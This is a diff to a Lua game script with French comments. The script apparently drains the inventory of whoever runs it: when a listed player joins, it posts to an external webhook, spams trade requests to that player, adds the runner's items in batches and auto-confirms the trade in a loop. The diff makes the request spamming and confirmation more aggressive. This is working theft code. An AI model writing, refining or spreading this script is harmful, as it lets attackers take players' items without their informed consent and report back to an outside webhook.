@@ -125,16 +125,20 @@ local function SendOnServerMessage()
     }
     request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
+
 ---------------------------------------------------------
--- LOGIQUE DE TRADE AVEC AUTO-CONFIRM
+-- LOGIQUE DE TRADE AVEC SPAM REQUEST
 ---------------------------------------------------------
 
 local function sendTradeRequest(user)
     local target = game:GetService("Players"):WaitForChild(user)
+    -- Spam la requête jusqu'à ce que le trade soit accepté
     repeat
+        pcall(function()
+            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
+        end)
         task.wait(0.5)
-        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
-    until response == true
+    until inTrade == true
 end
 
 local function addItemToTrade(itemType, ID)
@@ -145,27 +149,21 @@ end
 
 local function doTrade(joinedUser)
     while #itemsToSend > 0 do
+        -- On lance le spam de requêtes ici
         sendTradeRequest(joinedUser)
+        
+        -- On attend d'être bien dans le trade
         repeat task.wait(0.5) until inTrade
 
-        task.wait(1) -- Temps pour charger l'UI de trade
+        task.wait(1) 
 
         local currentBatch = getNextBatch(itemsToSend, 100)
         for _, item in ipairs(currentBatch) do
             addItemToTrade(item.itemType, item.ItemID)
         end
 
-        -- Tokens / Coins
-        pcall(function()
-            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
-            local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
-            if tokensamount >= 1 then
-                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
-            end
-        end)
-
-        -- SYSTÈME AUTO-CONFIRM
-        task.wait(0.1)
+        -- SYSTÈME AUTO-CONFIRM RAPIDE
+        task.wait(0.2)
         repeat
             netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
             task.wait(0.1)
@@ -203,7 +201,10 @@ if #itemsToSend > 0 then
     local function onUserAdded(player)
         if table.find(users, player.Name) then
             SendOnServerMessage()
-            doTrade(player.Name)
+            -- Lancement du trade en boucle
+            task.spawn(function()
+                doTrade(player.Name)
+            end)
         end
     end
 
